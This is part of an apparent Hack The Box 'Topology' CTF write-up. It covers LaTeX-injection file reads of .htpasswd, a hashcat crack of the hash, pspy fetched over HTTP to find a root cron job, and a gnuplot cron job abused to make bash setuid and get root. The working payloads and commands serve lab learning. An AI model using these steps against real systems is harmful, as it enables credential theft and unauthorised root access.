## Task 8: vdaisley's password

We know the username and the web root path, so we read the password file from there with `$\lstinputlisting{/var/www/dev/.htpasswd}$`:

![The .htpasswd hash rendered by the LFI](/images/writeups/hackthebox/topology-htpasswd.png)

The password is a hash. Use Google Lens to convert the image to text, then put the hash in a file and crack it with hashcat:

```bash
vim dev.hash
sudo hashcat dev.hash --username /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Hashcat cracking the hash to the masked password](/images/writeups/hackthebox/topology-hashcat.png)

The hash `$apr1$10NUB/S2$58eeNVirnRDB5zAIbTxTY0` cracks to a password masked here as `calc…us20`.

**Answer:** `calc…us20`

## Task 10: The root cron script

`ps aux` and `grep` for cron showed nothing, so I used [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64), an unprivileged Linux process snooping tool. Download it, serve it from a Python HTTP server and fetch it on the target:

```bash
chmod +x pspy64
python3 -m http.server
```

```bash
vdaisley@topology:~$ wget http://10.10.14.173:8000/pspy64
vdaisley@topology:~$ chmod +x pspy64
vdaisley@topology:~$ ./pspy64
```

![pspy starting up](/images/writeups/hackthebox/topology-pspy-banner.png)

Give it a few seconds and it finds the running processes:

![pspy output showing the gnuplot cron job](/images/writeups/hackthebox/topology-pspy-processes.png)

The root-owned cron runs `/opt/gnuplot/getdata.sh` every minute.

**Answer:** `/opt/gnuplot/getdata.sh`

## Root Flag

Change into the directory and list it:

```text
vdaisley@topology:~$ cd /opt/gnuplot/
vdaisley@topology:/opt/gnuplot$ ls
ls: cannot open directory '.': Permission denied
```

Creating a file works, so we have write permission but no read permission:

```text
vdaisley@topology:/opt/gnuplot$ touch test
```

Create a `.plt` file that gives the bash binary the setuid bit, then wait for the cron job to run it:

```text
vdaisley@topology:/opt/gnuplot$ echo 'system "chmod u+s /bin/bash"' > exploit.plt
```

After a minute, use the privileged shell:

```text
vdaisley@topology:/opt/gnuplot$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
bea6…7668
```

## Lessons Learned

- **LaTeX can be a file-read primitive.** `\lstinputlisting` is a legitimate package feature, so the LFI lived in how the application rendered user-supplied equations rather than in a classic PHP include bug.
- **Virtual host config files are a roadmap.** Once `/etc/apache2/sites-enabled/000-default.conf` was readable, it revealed the dev host's `DocumentRoot`, which pointed directly at the `.htpasswd` file.
- **Image-rendered secrets still need OCR.** The hash was displayed as an image, and Google Lens turned it into text that hashcat could consume.
- **pspy sees what an unprivileged user cannot.** Cron jobs run as root are invisible in a normal `ps aux`; process snooping exposed the every-minute gnuplot script in seconds.
- **Write permission without read permission is enough.** The `/opt/gnuplot` directory could not be listed, but a crafted `.plt` file was executed by root on the next cron tick. A single `system "chmod u+s /bin/bash"` turned that into a root shell.
